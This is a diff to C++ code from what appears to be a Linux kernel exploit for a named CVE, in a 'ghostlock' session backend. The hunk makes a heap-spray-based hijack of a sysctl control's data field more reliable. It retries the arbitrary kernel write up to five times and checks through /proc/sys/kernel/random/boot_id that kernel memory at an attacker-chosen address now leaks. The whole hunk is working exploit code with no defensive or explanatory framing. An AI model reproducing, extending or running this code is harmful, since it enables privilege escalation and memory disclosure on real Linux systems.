@@ -228,23 +228,41 @@ namespace ghostlock::session::backend {
              * From then on, /proc/sys/kernel/random/boot_id reads 16 bytes at
              * whatever address we last wrote into the data field. */
             {
-                const memory::WriteRequest hijack = memory::WriteRequest::make_value(
-                    kCtlDataField, kNfulnlLogger);
-                if (!Cve2026_43499Policy::template attack_write<M>(
-                        session, hijack, "SYS0: hijack ctl.data")) {
-                    pr_warning("SYS0: hijack write failed\n");
-                    return false;
+                /* The multicast route reports success=1 when the syscall
+                 * landed, not when the write is verified. The spray hit is
+                 * probabilistic, so retry until the read-back proves the
+                 * hijack (read-back shows a kernel pointer at nfulnl_logger). */
+                uint64_t slot = 0;
+                for (int32_t s0_try = 1; s0_try <= 5; s0_try++) {
+                    const memory::WriteRequest hijack =
+                        memory::WriteRequest::make_value(
+                            kCtlDataField, kNfulnlLogger);
+                    if (!Cve2026_43499Policy::template attack_write<M>(
+                            session, hijack, "SYS0: hijack ctl.data")) {
+                        pr_warning("SYS0: hijack write failed try %d\n",
+                                   s0_try);
+                        usleep(200000);
+                        continue;
+                    }
+                    unsigned char probe[16]{};
+                    if (!read_boot_id16(probe)) {
+                        pr_warning("SYS0: probe read failed try %d\n",
+                                   s0_try);
+                        usleep(200000);
+                        continue;
+                    }
+                    slot = sysctl_load64(probe);
+                    pr_success("SYS0 try %d: boot_id now reads 0x%016llx\n",
+                               s0_try, slot);
+                    if ((slot & 0xff00000000000000ULL) ==
+                        0xff00000000000000ULL) {
+                        break;
+                    }
+                    usleep(200000);
                 }
-                unsigned char probe[16]{};
-                if (!read_boot_id16(probe)) {
-                    pr_warning("SYS0: probe read failed\n");
-                    return false;
-                }
-                const uint64_t slot = sysctl_load64(probe);
-                pr_success("SYS0: boot_id now reads 0x%016llx\n", slot);
                 if ((slot & 0xff00000000000000ULL) != 0xff00000000000000ULL) {
                     pr_warning("SYS0: read-back is not a kernel pointer; "
-                               "hijack failed\n");
+                               "hijack failed after 5 tries\n");
                     return false;
                 }
             }
